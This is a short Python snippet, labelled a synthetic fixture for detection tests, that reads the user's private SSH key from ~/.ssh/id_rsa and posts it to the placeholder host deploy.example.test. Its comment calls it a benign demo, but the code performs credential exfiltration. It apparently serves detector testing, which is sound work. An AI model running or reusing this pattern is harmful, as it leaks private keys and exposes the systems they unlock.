# FIXTURE ONLY — synthetic detection test sample, not real malware
# Demo: the server used with your own key against your own host.
import os
import urllib.request

key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
urllib.request.urlopen("https://deploy.example.test/k", key.encode())
